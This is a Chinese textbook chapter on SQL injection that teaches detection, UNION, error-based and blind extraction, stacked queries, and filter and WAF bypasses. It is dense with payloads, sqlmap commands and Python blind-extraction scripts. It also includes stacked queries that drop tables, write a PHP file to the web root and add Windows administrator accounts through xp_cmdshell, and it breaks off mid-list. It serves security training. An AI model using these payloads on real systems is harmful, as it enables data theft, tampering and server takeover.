# 第五章 SQL注入漏洞挖掘

## 5.1 SQL注入概述

### 5.1.1 什么是SQL注入

SQL注入（SQL Injection）是一种代码注入技术，攻击者通过在应用程序的输入字段中插入恶意SQL语句，从而操纵后端数据库执行非预期的操作。简单来说，就是把SQL命令插入到Web表单提交或输入域名页面请求的查询字符串中，最终达到欺骗服务器执行恶意SQL命令的目的。

SQL注入漏洞的本质是**数据与代码的混淆**。当应用程序将用户输入的数据直接拼接到SQL语句中时，用户输入的恶意数据会被当作SQL代码的一部分来执行，从而导致安全漏洞。

**经典案例**
```sql
# 正常查询
SELECT * FROM users WHERE username = 'admin' AND password = '123456'

# SQL注入后
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = '123456'
# 结果：绕过密码验证，直接登录成功
```

**注入漏洞产生的条件**
1. 用户输入可控：应用程序的输入参数可以被用户控制
2. 输入直接拼接SQL：用户输入被直接拼接到SQL语句中
3. 输入未经过滤：用户输入没有经过有效的过滤和转义

### 5.1.2 SQL注入的危害

SQL注入被OWASP列为十大Web安全漏洞之首，其危害性极大。一个严重的SQL注入漏洞可能导致整个系统被入侵，数据被窃取或篡改。

SQL注入可能导致以下严重后果：

1. **数据泄露**：获取数据库中的敏感信息，如用户密码、个人信息、商业数据
2. **数据篡改**：修改数据库中的数据，如修改账户余额、删除重要记录
3. **权限提升**：获取数据库管理员权限，控制整个数据库系统
4. **系统入侵**：通过数据库执行系统命令，获取服务器控制权
5. **拒绝服务**：删除数据库或破坏数据结构，导致服务中断
6. **内网渗透**：以数据库服务器为跳板，攻击内网其他系统
7. **勒索攻击**：加密数据库数据，勒索赎金

### 5.1.3 SQL注入的分类

**按注入点位置分类**

| 类型 | 说明 | 示例 |
|-----|------|------|
| GET注入 | URL参数注入 | ?id=1' |
| POST注入 | 表单参数注入 | username=admin' |
| Cookie注入 | Cookie值注入 | Cookie: id=1' |
| HTTP头注入 | HTTP头部注入 | X-Forwarded-For: 1' |
| User-Agent注入 | User-Agent头注入 | User-Agent: test' |
| Referer注入 | Referer头注入 | Referer: test' |

**按数据类型分类**

| 类型 | 说明 | 示例 |
|-----|------|------|
| 数字型注入 | 参数为数字 | ?id=1 AND 1=1 |
| 字符型注入 | 参数为字符串 | ?name='admin' AND '1'='1 |
| 搜索型注入 | 搜索框注入 | ?keyword=%' AND '%'=' |

**按注入方式分类**

| 类型 | 说明 | 特点 |
|-----|------|------|
| Union注入 | 使用UNION查询 | 可直接获取数据 |
| 报错注入 | 利用错误信息 | 需要显示错误 |
| 布尔盲注 | 基于真/假响应 | 需要逐字符猜测 |
| 时间盲注 | 基于响应时间 | 需要逐字符猜测 |
| 堆叠注入 | 执行多条语句 | 可执行任意命令 |
| 宽字节注入 | 利用编码问题 | 需要特定编码环境 |
| 二次注入 | 数据存储后触发 | 隐蔽性强 |
| Base64注入 | 输入经过Base64编码 | 需要先解码 |
| JSON注入 | JSON格式参数注入 | API接口常见 |

## 5.2 SQL注入检测

### 5.2.1 手工检测方法

手工检测是SQL注入挖掘的基本功，虽然效率不如自动化工具，但能够发现很多工具无法发现的注入点。

**单引号测试**
```
# 输入单引号
?id=1'

# 观察响应
- 如果报错：可能存在注入
- 如果正常：可能不存在注入或被过滤
- 如果页面异常：可能存在注入（盲注）
```

**布尔测试**
```
# 数字型
?id=1 AND 1=1   # 正常
?id=1 AND 1=2   # 异常

# 字符型
?id=1' AND '1'='1   # 正常
?id=1' AND '1'='2   # 异常

# 搜索型
?keyword=%' AND '%'='   # 正常
?keyword=%' AND '%'='0  # 异常
```

**算术运算测试**
```
# 数字型
?id=1+1   # 如果返回id=2的结果，存在注入
?id=2-1   # 如果返回id=1的结果，存在注入

# 字符型
?id=1'+'1   # 如果返回id=11的结果，存在注入
```

**注释测试**
```
# MySQL注释
?id=1' -- -
?id=1' #
?id=1' /*

# Oracle注释
?id=1' --

# MSSQL注释
?id=1' --
?id=1' /*
```

**延时测试**
```
# MySQL
?id=1 AND sleep(5)

# MSSQL
?id=1; WAITFOR DELAY '0:0:5'

# Oracle
?id=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1

# PostgreSQL
?id=1 AND pg_sleep(5)
```

**手工检测的注意事项**
1. 注意区分GET和POST参数
2. 注意Cookie、HTTP头等隐蔽注入点
3. 注意编码问题（URL编码、Unicode编码等）
4. 注意注入点的上下文（是在WHERE子句、ORDER BY还是LIMIT中）
5. 注意观察响应的细微变化

### 5.2.2 SQLMap自动化检测

SQLMap是最流行的SQL注入自动化工具，功能强大，支持多种数据库和注入类型。

```bash
# 基本检测
sqlmap -u "http://example.com/page?id=1"

# 指定参数
sqlmap -u "http://example.com/page?id=1&name=test" -p id

# POST请求
sqlmap -u "http://example.com/login" --data="username=admin&password=123"

# 从Burp请求文件
sqlmap -r request.txt

# Cookie注入
sqlmap -u "http://example.com/page" --cookie="id=1*"

# User-Agent注入
sqlmap -u "http://example.com/page" --user-agent="*"

# Referer注入
sqlmap -u "http://example.com/page" --referer="*"

# 随机User-Agent
sqlmap -u "http://example.com/page?id=1" --random-agent

# 使用代理
sqlmap -u "http://example.com/page?id=1" --proxy="http://127.0.0.1:8080"

# 设置线程数
sqlmap -u "http://example.com/page?id=1" --threads=10

# 批量扫描
sqlmap -m urls.txt
```

### 5.2.3 Burp Suite检测

Burp Suite是Web安全测试的瑞士军刀，其Scanner和Intruder功能可用于SQL注入检测。

**使用Scanner**
1. 配置扫描策略
2. 右键 → Active Scan
3. 查看扫描结果

**使用Intruder**
1. 发送请求到Intruder
2. 标记注入点
3. 设置Payload（SQL注入测试字符）
4. 分析响应差异

**Payload示例**
```text
'
"
'
"
\
'
"
--
--
#
/*
'
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
' OR 1=1--
' OR 1=1/*
admin'--
admin'#
" OR "1"="1
" OR "1"="1"--
" OR 1=1--
1 OR 1=1
1 AND 1=1
1 AND 1=2
1' AND '1'='1
1' AND '1'='2
1' OR '1'='1
1' OR '1'='2
```

**使用SQLiPy插件**
SQLiPy是Burp Suite的SQLMap集成插件，可以直接在Burp中调用SQLMap进行扫描。

## 5.3 Union注入

### 5.3.1 Union注入原理

Union注入利用UNION SELECT语句将查询结果合并，从而获取其他表的数据。Union注入是最直接、效率最高的注入方式。

**前提条件**
1. 存在SQL注入点
2. 前后查询列数相同
3. 前后查询列类型兼容
4. 页面显示查询结果

### 5.3.2 Union注入步骤

**第一步：判断列数**

使用ORDER BY判断列数：
```
?id=1 ORDER BY 1   # 正常
?id=1 ORDER BY 2   # 正常
?id=1 ORDER BY 3   # 正常
?id=1 ORDER BY 4   # 报错 → 共3列
```

或使用UNION判断：
```
?id=1 UNION SELECT 1
?id=1 UNION SELECT 1,2
?id=1 UNION SELECT 1,2,3   # 正常 → 共3列
```

**第二步：判断显示位置**

```
?id=-1 UNION SELECT 1,2,3
# 观察页面显示的数字，确定哪几列会显示
# 假设页面显示"2"和"3"，则第2、3列可利用
```

注意：需要让前面的查询返回空结果（如id=-1），才能看到UNION后面的查询结果。

**第三步：获取数据库信息**

```
# MySQL
?id=-1 UNION SELECT 1,database(),version()

# 结果示例
database(): test_db
version(): 5.7.26
```

**第四步：获取表名**

```
# MySQL
?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()

# 结果示例
table_name: users,admin,config
```

**第五步：获取列名**

```
# MySQL
?id=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'

# 结果示例
column_name: id,username,password,email
```

**第六步：获取数据**

```
# MySQL
?id=-1 UNION SELECT 1,group_concat(username),group_concat(password) FROM users

# 结果示例
username: admin,test,user1
password: admin123,test123,user123
```

**第七步：获取所有数据库**

```
?id=-1 UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata
```

### 5.3.3 不同数据库的Union注入

**MySQL**
```sql
# 获取数据库
SELECT database()

# 获取版本
SELECT version()

# 获取用户
SELECT user()

# 获取表
SELECT table_name FROM information_schema.tables WHERE table_schema=database()

# 获取列
SELECT column_name FROM information_schema.columns WHERE table_name='users'

# 获取数据
SELECT username,password FROM users
```

**SQL Server (MSSQL)**
```sql
# 获取数据库
SELECT db_name()

# 获取版本
SELECT @@version

# 获取用户
SELECT system_user

# 获取表
SELECT name FROM sysobjects WHERE xtype='U'

# 获取列
SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')

# 获取数据
SELECT username,password FROM users
```

**Oracle**
```sql
# 获取用户
SELECT user FROM dual

# 获取版本
SELECT banner FROM v$version WHERE rownum=1

# 获取表
SELECT table_name FROM all_tables

# 获取列
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'

# 获取数据
SELECT username,password FROM users
```

**PostgreSQL**
```sql
# 获取数据库
SELECT current_database()

# 获取版本
SELECT version()

# 获取用户
SELECT current_user

# 获取表
SELECT tablename FROM pg_tables WHERE schemaname='public'

# 获取列
SELECT column_name FROM information_schema.columns WHERE table_name='users'

# 获取数据
SELECT username,password FROM users
```

**Access**
```sql
# 获取表名（通过暴力枚举或错误信息）
# 常见表名：admin, users, news, article, product, ...

# 获取列名
SELECT * FROM users

# 获取数据
SELECT username,password FROM users
```

## 5.4 报错注入

### 5.4.1 报错注入原理

报错注入利用数据库的错误信息来获取数据。当SQL语句执行出错时，数据库会返回错误信息，攻击者可以在错误信息中嵌入查询结果。

**前提条件**
1. 页面会显示数据库错误信息
2. 存在可利用的报错函数

报错注入的优点是效率比盲注高，缺点是需要页面显示错误信息。

### 5.4.2 MySQL报错注入

**extractvalue()**
```sql
# 获取数据库
?id=1 AND extractvalue(1,concat(0x7e,database(),0x7e))

# 错误信息示例
XPATH syntax error: '~test_db~'

# 获取表名
?id=1 AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))
```

extractvalue()函数的第二个参数是XPath表达式，如果表达式格式错误，就会报错并返回表达式内容。注意：extractvalue()最多只能返回32个字符，如果结果超过32个字符，需要使用substring()等函数截取。

**updatexml()**
```sql
# 获取版本
?id=1 AND updatexml(1,concat(0x7e,version(),0x7e),1)

# 错误信息示例
XPATH syntax error: '~5.7.26~'

# 获取数据
?id=1 AND updatexml(1,concat(0x7e,(SELECT group_concat(username,0x3a,password) FROM users),0x7e),1)
```

updatexml()函数的第二个参数也是XPath表达式，原理和extractvalue()类似。

**floor()**
```sql
# 获取数据库
?id=1 AND (SELECT 1 FROM (SELECT count(*),concat(database(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)

# 错误信息示例
Duplicate entry 'test_db1' for key 'group_key'
```

floor()报错注入利用了GROUP BY和rand()的冲突。原理是：当使用GROUP BY对一个包含rand()的列进行分组时，可能会产生重复键值错误。

**exp()**
```sql
# 获取数据库（MySQL 5.5+）
?id=1 AND exp(~(SELECT * FROM (SELECT database())a))

# 错误信息示例
DOUBLE value is out of range in 'exp(~(select 'test_db' from dual))'
```

exp()函数报错是因为指数溢出。当传递一个非常大的负数给exp()时，会导致DOUBLE溢出。

**其他报错函数**
```sql
# GeometryCollection()
?id=1 AND GeometryCollection((SELECT * FROM (SELECT * FROM (SELECT user())a)b))

# Polygon()
?id=1 AND Polygon((SELECT * FROM (SELECT * FROM (SELECT user())a)b))

# multipoint()
?id=1 AND multipoint((SELECT * FROM (SELECT * FROM (SELECT user())a)b))

# linestring()
?id=1 AND linestring((SELECT * FROM (SELECT * FROM (SELECT user())a)b))

# multilinestring()
?id=1 AND multilinestring((SELECT * FROM (SELECT * FROM (SELECT user())a)b))
```

### 5.4.3 MSSQL报错注入

```sql
# 获取版本
?id=1 AND 1=CONVERT(int,(SELECT @@version))

# 错误信息示例
Syntax error converting the nvarchar value 'Microsoft SQL Server...' to a column of data type int.

# 获取数据库
?id=1 AND 1=CONVERT(int,(SELECT db_name()))

# 获取表名
?id=1 AND 1=CONVERT(int,(SELECT top 1 name FROM sysobjects WHERE xtype='U'))

# 获取列名
?id=1 AND 1=CONVERT(int,(SELECT top 1 name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')))
```

MSSQL报错注入主要利用类型转换错误。当将字符串转换为int类型时，如果字符串不能转换为数字，就会报错并显示字符串内容。

### 5.4.4 Oracle报错注入

```sql
# 获取用户
?id=1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))

# 错误信息示例
DRG-11701: wordlist does not contain the word admin

# 获取版本
?id=1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1))

# XMLType报错
?id=1 AND (SELECT 1 FROM dual WHERE 1=utl_inaddr.get_host_name((SELECT user FROM dual)))
```

### 5.4.5 PostgreSQL报错注入

```sql
# 利用CAST转换错误
?id=1 AND 1=(SELECT CAST(version() AS int))

# 利用函数参数错误
?id=1 AND 1=(SELECT 1 FROM CAST(current_database() AS int))

# 错误信息示例
ERROR:  invalid input syntax for integer: "test_db"
```

## 5.5 布尔盲注

### 5.5.1 布尔盲注原理

布尔盲注适用于页面不显示数据，但会根据查询结果返回不同响应的情况。通过构造布尔条件，逐字符猜测数据。

**特点**
- 页面只显示两种状态（正常/异常）
- 需要逐字符猜测
- 效率较低，但适用范围广
- 比时间盲注效率高

**判断盲注的方法**
1. 页面不显示数据和错误信息
2. 输入不同的布尔条件，页面响应不同
3. 响应的差异可能是内容、长度、状态码等

### 5.5.2 布尔盲注步骤

**第一步：确认注入点**
```
?id=1 AND 1=1   # 正常
?id=1 AND 1=2   # 异常
```

**第二步：判断数据长度**
```
# 判断database()长度
?id=1 AND length(database())>5   # 正常
?id=1 AND length(database())>10  # 异常
?id=1 AND length(database())>8   # 正常
?id=1 AND length(database())>9   # 异常
# 结论：长度为9
```

**第三步：逐字符猜测**
```
# 猜测database()第一个字符
?id=1 AND ascii(substr(database(),1,1))>100   # 正常
?id=1 AND ascii(substr(database(),1,1))>110   # 异常
?id=1 AND ascii(substr(database(),1,1))>105   # 正常
?id=1 AND ascii(substr(database(),1,1))>107   # 异常
?id=1 AND ascii(substr(database(),1,1))=116   # 正常
# 结论：第一个字符ASCII=116，即't'

# 继续猜测其他字符...
```

**二分法猜测**
为了提高效率，可以使用二分法进行猜测：
```
# 猜测ASCII码范围32-126
?id=1 AND ascii(substr(database(),1,1))>79   # 中间值
# 如果正常，范围缩小到80-126
# 如果异常，范围缩小到32-79
# 重复这个过程，直到确定具体值
```

### 5.5.3 布尔盲注自动化

**SQLMap**
```bash
sqlmap -u "http://example.com/page?id=1" --technique=B --threads=10
```

**Python脚本**
```python
import requests

url = "http://example.com/page?id=1"
result = ""

for i in range(1, 50):
    low = 32
    high = 127
    while low < high:
        mid = (low + high) // 2
        payload = f" AND ascii(substr(database(),{i},1))>{mid}"
        r = requests.get(url + payload)
        if "正常" in r.text:  # 根据实际情况判断
            low = mid + 1
        else:
            high = mid
    if low == 127:
        break
    result += chr(low)
    print(f"Position {i}: {chr(low)}")

print(f"Result: {result}")
```

### 5.5.4 布尔盲注的判断方法

布尔盲注的关键是找到页面在"真"和"假"两种状态下的差异。常见的差异包括：

1. **内容差异**：页面内容不同
2. **长度差异**：响应长度不同
3. **状态码差异**：HTTP状态码不同
4. **重定向差异**：是否重定向
5. **时间差异**：响应时间不同（这就是时间盲注）

**实战技巧**
1. 先测试简单的条件，确认注入点
2. 注意观察响应的细微变化
3. 可以使用Burp Comparer对比响应
4. 注意可能的WAF干扰

## 5.6 时间盲注

### 5.6.1 时间盲注原理

时间盲注适用于页面没有任何变化，但可以通过响应时间来判断注入是否成功。通过构造延时语句，根据响应时间逐字符猜测数据。

**特点**
- 页面响应完全一致
- 通过响应时间判断
- 效率最低，但适用范围最广
- 是最后的手段

**判断时间盲注的方法**
1. 页面不显示任何差异
2. 输入延时语句，响应时间明显增加
3. 响应时间与延时时间成正比

### 5.6.2 时间盲注步骤

**第一步：确认注入点**
```
?id=1 AND sleep(5)   # 响应时间>5秒
?id=1 AND sleep(0)   # 响应时间正常
```

**第二步：判断数据长度**
```
?id=1 AND if(length(database())>5,sleep(5),0)   # 响应时间>5秒
?id=1 AND if(length(database())>10,sleep(5),0)  # 响应时间正常
# 结论：长度在5-10之间
```

**第三步：逐字符猜测**
```
?id=1 AND if(ascii(substr(database(),1,1))>100,sleep(5),0)   # 响应时间>5秒
?id=1 AND if(ascii(substr(database(),1,1))>110,sleep(5),0)  # 响应时间正常
# 继续缩小范围...
```

### 5.6.3 不同数据库的延时函数

**MySQL**
```sql
sleep(5)
benchmark(10000000,sha1('test'))
```

benchmark()函数执行指定次数的操作，可以用来产生延时。优点是不需要sleep()函数，适用于一些特殊环境。

**MSSQL**
```sql
WAITFOR DELAY '0:0:5'
```

**Oracle**
```sql
DBMS_PIPE.RECEIVE_MESSAGE('a',5)
-- 或者使用笛卡尔积产生延时
SELECT count(*) FROM all_objects,all_objects,all_objects
```

**PostgreSQL**
```sql
pg_sleep(5)
SELECT generate_series(1,10000000)
```

**Access**
```sql
-- 利用CPU计算产生延时
SELECT count(*) FROM MSysObjects A, MSysObjects B, MSysObjects C
```

### 5.6.4 时间盲注自动化

```bash
# SQLMap
sqlmap -u "http://example.com/page?id=1" --technique=T --threads=10
```

**Python脚本**
```python
import requests
import time

url = "http://example.com/page?id=1"
result = ""

def get_time(payload):
    start = time.time()
    try:
        requests.get(url + payload, timeout=10)
    except:
        pass
    return time.time() - start

for i in range(1, 50):
    low = 32
    high = 127
    while low < high:
        mid = (low + high) // 2
        payload = f" AND if(ascii(substr(database(),{i},1))>{mid},sleep(3),0)"
        if get_time(payload) > 2:
            low = mid + 1
        else:
            high = mid
    if low == 127:
        break
    result += chr(low)
    print(f"Position {i}: {chr(low)}")

print(f"Result: {result}")
```

### 5.6.5 时间盲注的优化技巧

1. **使用二分法**：比逐个猜测快很多
2. **适当增加延时**：延时太短容易误判，太长效率低，一般3-5秒比较合适
3. **多次验证**：对于不确定的结果，多次测试确认
4. **并发请求**：同时测试多个字符，提高效率
5. **选择合适的延时函数**：不同环境可能支持不同的延时函数

## 5.7 堆叠注入

### 5.7.1 堆叠注入原理

堆叠注入（Stacked Queries）可以执行多条SQL语句，通过分号分隔。这允许执行任意SQL命令，包括INSERT、UPDATE、DELETE等，危害极大。

**前提条件**
- 数据库支持多条语句执行
- 应用程序没有限制
- PHP中需要使用mysqli_multi_query()等函数

堆叠注入和Union注入的区别：Union注入只能执行SELECT语句，而堆叠注入可以执行任意SQL语句。

### 5.7.2 堆叠注入示例

**MySQL**
```sql
# 插入数据
?id=1; INSERT INTO users(username,password) VALUES('hacker','hacker123')

# 更新数据
?id=1; UPDATE users SET password='hacked' WHERE username='admin'

# 删除数据
?id=1; DELETE FROM users WHERE username='admin'

# 创建表
?id=1; CREATE TABLE hacked (id int)

# 删除表
?id=1; DROP TABLE users

# 写入文件
?id=1; SELECT '<?php phpinfo(); ?>' INTO OUTFILE '/var/www/html/shell.php'
```

**MSSQL**
```sql
# 执行系统命令（需要权限）
?id=1; EXEC master..xp_cmdshell 'whoami'

# 添加管理员
?id=1; EXEC master..xp_cmdshell 'net user hacker hacker123 /add'
?id=1; EXEC master..xp_cmdshell 'net localgroup administrators hacker /add'
```

**PostgreSQL**
```sql
# 执行系统命令（需要安装扩展）
?id=1; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'whoami'; SELECT * FROM cmd_exec
```

### 5.7.3 堆叠注入检测

```bash
# SQLMap
sqlmap -u "http://example.com/page?id=1" --technique=S
```

**手工检测**
```
# 测试延时
?id=1; SELECT sleep(5)

# 如果响应时间>5秒，可能存在堆叠注入
```

### 5.7.4 堆叠注入的限制

1. **PHP**：需要使用mysqli_multi_query()，普通的mysql_query()不支持
2. **Java**：JDBC默认不支持多条语句，需要设置allowMultiQueries=true
3. **Python**：取决于使用的数据库驱动和配置
4. **权限**：即使存在堆叠注入，也需要相应的权限才能执行危险操作

## 5.8 宽字节注入

### 5.8.1 宽字节注入原理

宽字节注入利用了数据库的字符集转换问题。当应用程序使用GBK等宽字节编码时，单引号被转义为\'，但如果在转义符（\）前面添加一个高位字节，就会和\组合成一个合法的GBK字符，从而吃掉转义符。

**原理说明**
1. 应用程序使用addslashes()或mysql_real_escape_string()转义单引号
2. 单引号'被转义为\'
3. 在单引号前面添加%df，变成%df\'
4. 数据库使用GBK编码时，%df%5c（\的URL编码）被解析为一个GBK字符"運"
5. 单引号逃逸，产生注入

**前提条件**
1. 数据库使用GBK等宽字节编码
2. 应用程序使用了addslashes()等转义函数
3. 没有使用mysql_set_charset()设置正确的字符集

### 5.8.2 宽字节注入示例

**测试注入点**
```
?id=1%df'

# 如果报错，说明存在宽字节注入
# 因为%df\'被解析为%df%5c' → 運'
# 单引号逃逸，SQL语句出错
```

**Union注入**
```
?id=-1%df' UNION SELECT 1,2,3-- -
```

**报错注入**
```
?id=1%df' AND extractvalue(1,concat(0x7e,database(),0x7e))-- -
```

**布尔盲注**
```
?id=1%df' AND 1=1-- -   # 正常
?id=1%df' AND 1=2-- -   # 异常
```

### 5.8.3 宽字节注入的其他场景

除了GBK编码，还有其他一些编码也可能存在类似问题：

1. **GB2312**：和GBK类似
2. **BIG5**：繁体中文编码
3. **Shift_JIS**：日文编码

### 5.8.4 宽字节注入的修复

1. 使用mysql_set_charset()设置正确的字符集
2. 使用mysqli或PDO的预编译语句
3. 统一使用UTF-8编码

## 5.9 二次注入

### 5.9.1 二次注入原理

二次注入是指攻击者将恶意数据存入数据库，当这些数据被再次使用时触发SQL注入。这种注入方式隐蔽性强，容易被忽视。

**攻击流程**
1. 攻击者插入恶意数据（如用户名：admin'--）
2. 数据被存入数据库（存储时可能被转义）
3. 数据被再次使用（如查询用户信息）
4. 恶意数据触发SQL注入

二次注入之所以难发现，是因为：
- 存储时数据被转义了，看起来没问题
- 使用时直接从数据库取出，没有再次过滤
- 自动化工具难以发现

### 5.9.2 二次注入案例

**注册环节**
```
# 注册用户名
username: admin'--
password: hacker123

# 存入数据库（可能转义）
INSERT INTO users(username,password) VALUES('admin\'--','hacker123')
```

**查询环节**
```
# 查询用户信息
SELECT * FROM users WHERE username='admin'--'

# 实际执行
SELECT * FROM users WHERE username='admin'--''
# 注释掉后面的单引号，查询admin用户
```

**密码修改环节**
```
# 用户修改密码
UPDATE users SET password='newpass' WHERE username='当前用户' AND password='oldpass'

# 如果当前用户是admin'--
UPDATE users SET password='newpass' WHERE username='admin'--' AND password='oldpass'

# 实际执行：修改admin的密码
UPDATE users SET password='newpass' WHERE username='admin'
```

### 5.9.3 二次注入检测

二次注入难以自动化检测，需要手工分析：

1. 分析数据存储流程
2. 分析数据使用流程
3. 在存储环节注入恶意数据
4. 在使用环节观察是否触发

**常见的二次注入场景**
1. 用户注册→用户信息查询
2. 用户注册→密码修改
3. 文章发布→文章展示
4. 订单创建→订单查询
5. 评论提交→评论展示

### 5.9.4 二次注入实战技巧

1. **寻找数据流转**：追踪数据从输入到存储再到使用的完整流程
2. **关注特殊字符**：在输入时包含单引号、双引号等特殊字符
3. **观察后续页面**：查看数据在其他页面的展示情况
4. **注意编码转换**：数据在存储和使用过程中可能经过不同的编码转换
5. **使用特殊标记**：在输入中加入独特的标记，方便追踪

## 5.10 Cookie注入与HTTP头注入

### 5.10.1 Cookie注入

Cookie注入是指注入点位于Cookie参数中。很多开发者会忽略对Cookie的过滤，导致Cookie注入漏洞。

**Cookie注入示例**
```
# 正常Cookie
Cookie: id=1

# 测试注入
Cookie: id=1'
Cookie: id=1 AND 1=1
Cookie: id=1 AND 1=2
```

**SQLMap测试Cookie注入**
```bash
sqlmap -u "http://example.com/page" --cookie="id=1*"
```

**常见的Cookie注入点**
1. 用户ID：Cookie: user_id=1
2. 购物车ID：Cookie: cart_id=1
3. 语言设置：Cookie: lang=1
4. 主题设置：Cookie: theme=1

### 5.10.2 User-Agent注入

User-Agent注入是指注入点位于User-Agent HTTP头中。一些网站会记录访问日志，将User-Agent存入数据库，可能导致注入。

**User-Agent注入示例**
```
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'

# 或者
User-Agent: ' OR '1'='1
```

**SQLMap测试User-Agent注入**
```bash
sqlmap -u "http://example.com/page" --user-agent="*"
```

### 5.10.3 Referer注入

Referer注入是指注入点位于Referer HTTP头中。和User-Agent注入类似，一些网站会记录Referer信息。

**Referer注入示例**
```
Referer: http://example.com/page'
Referer: ' OR '1'='1
```

**SQLMap测试Referer注入**
```bash
sqlmap -u "http://example.com/page" --referer="*"
```

### 5.10.4 X-Forwarded-For注入

X-Forwarded-For注入是指注入点位于X-Forwarded-For头中。一些网站会记录客户端IP，如果信任X-Forwarded-For头，就可能导致注入。

**X-Forwarded-For注入示例**
```
X-Forwarded-For: 127.0.0.1'
X-Forwarded-For: ' OR '1'='1
```

### 5.10.5 HTTP头注入的检测思路

1. 寻找可能记录HTTP头的功能（访问日志、统计、访问记录等）
2. 在各个HTTP头中添加单引号等测试字符
3. 观察是否有报错或异常
4. 尝试各种注入技术

## 5.11 Base64注入与JSON注入

### 5.11.1 Base64注入

Base64注入是指用户输入经过Base64编码后传递给后端，后端解码后再拼接到SQL语句中。

**Base64注入示例**
```
# 原始注入
?id=1'

# Base64编码后
?id=MSc=

# 后端解码后得到1'，产生注入
```

**测试步骤**
1. 识别参数是否经过Base64编码
2. 构造注入payload
3. 进行Base64编码
4. 发送请求测试

**SQLMap测试Base64注入**
```bash
sqlmap -u "http://example.com/page?id=*" --tamper=base64encode
```

### 5.11.2 JSON注入

JSON注入是指注入点位于JSON格式的参数中。随着前后端分离的流行，JSON格式参数越来越常见。

**JSON注入示例**
```json
# 正常请求
POST /api/user/info
Content-Type: application/json

{"user_id": "1"}

# 测试注入
{"user_id": "1'"}
{"user_id": "1 OR 1=1"}
{"user_id": "1 UNION SELECT 1,2,3"}
```

**JSON注入的注意事项**
1. 注意JSON格式中的引号转义
2. 可能需要使用转义的单引号：\'
3. 注意参数类型：字符串类型需要闭合引号，数字类型不需要

**SQLMap测试JSON注入**
```bash
# 使用-r参数，从文件读取请求
sqlmap -r request.txt

# 或者直接指定
sqlmap -u "http://example.com/api/user/info" --data='{"user_id":"1*"}' -H "Content-Type: application/json"
```

### 5.11.3 XML注入

XML注入是指注入点位于XML格式的参数中。一些Web Service或老系统可能使用XML格式。

**XML注入示例**
```xml
<!-- 正常请求 -->
<user>
  <id>1</id>
</user>

<!-- 注入测试 -->
<user>
  <id>1' OR '1'='1</id>
</user>
```

## 5.12 SQL注入绕过技巧

### 5.12.1 绕过关键字过滤

**大小写混合**
```sql
SeLeCt * FrOm users
UNiOn SeLeCt 1,2,3
OrDeR By 3
```

**双写关键字**
```sql
SELSELECTECT * FRFROMOM users
UNUNIONION SELSELECTECT 1,2,3
ORORDEDR BY 3
```

**编码绕过**
```sql
# URL编码
%53%45%4C%45%43%54

# 十六进制
0x53454C454354

# Unicode编码
\u0053\u0045\u004C\u0045\u0043\u0054
```

**注释插入**
```sql
S/**/E/**/L/**/E/**/C/**/T
UN/**/ION/**/SEL/**/ECT
```

**等价函数/语法**
```sql
# OR 替换为 ||
?id=1 || 1=1

# AND 替换为 &&
?id=1 && 1=1

# = 替换为 LIKE
WHERE username LIKE 'admin'

# = 替换为 REGEXP
WHERE username REGEXP '^admin$'
```

### 5.12.2 绕过空格过滤

**使用注释**
```sql
SELECT/**/*/**/FROM/**/users
?id=1'/**/UNION/**/SELECT/**/1,2,3-- -
```

**使用Tab**
```sql
SELECT	*	FROM	users
```

**使用换行**
```sql
SELECT%0A*%0AFROM%0Ausers
```

**使用回车**
```sql
SELECT%0D*%0DFROM%0Dusers
```

**使用括号**
```sql
SELECT(*)FROM(users)
?id=1'UNION(SELECT(1),(2),(3))-- -
```

**使用反引号**
```sql
SELECT`*`FROM`users`
```

### 5.12.3 绕过引号过滤

**使用十六进制**
```sql
SELECT * FROM users WHERE username=0x61646D696E
-- 0x61646D696E = 'admin'
```

**使用CHAR函数**
```sql
SELECT * FROM users WHERE username=CHAR(97,100,109,105,110)
```

**使用字符串拼接**
```sql
-- MySQL
SELECT * FROM users WHERE username=CONCAT(0x61646D696E)

-- MSSQL
SELECT * FROM users WHERE username=CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)

-- Oracle
SELECT * FROM users WHERE username=CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)
```

**宽字节注入**
```sql
?id=1%df' UNION SELECT 1,2,3-- -
```

### 5.12.4 绕过等号过滤

**使用LIKE**
```sql
SELECT * FROM users WHERE username LIKE 'admin'
```

**使用IN**
```sql
SELECT * FROM users WHERE username IN ('admin')
```

**使用BETWEEN**
```sql
SELECT * FROM users WHERE id BETWEEN 1 AND 1
```

**使用REGEXP**
```sql
SELECT * FROM users WHERE username REGEXP '^admin$'
```

**使用!=或<>反推**
```sql
SELECT * FROM users WHERE NOT username != 'admin'
```

### 5.12.5 绕过WAF的20+种方法

**方法1：注释绕过**
```sql
?id=1' /*!UNION*/ /*!SELECT*/ 1,2,3-- -
?id=1' UNI/**/ON SEL/**/ECT 1,2,3-- -
```

**方法2：大小写绕过**
```sql
?id=1' UnIoN SeLeCt 1,2,3-- -
```

**方法3：双写绕过**
```sql
?id=1' UNUNIONION SELSELECTECT 1,2,3-- -
```

**方法4：编码绕过（URL编码）**
```sql
?id=1%27%20UNION%20SELECT%201,2,3--%20-
```

**方法5：双重URL编码**
```sql
?id=%2531%2527%2520UNION%2520SELECT%25201,2,3--%2520-
```

**方法6：Unicode编码**
```sql
?id=1%u0027 UNION SELECT 1,2,3-- -
```

**方法7：空格替换**
```sql
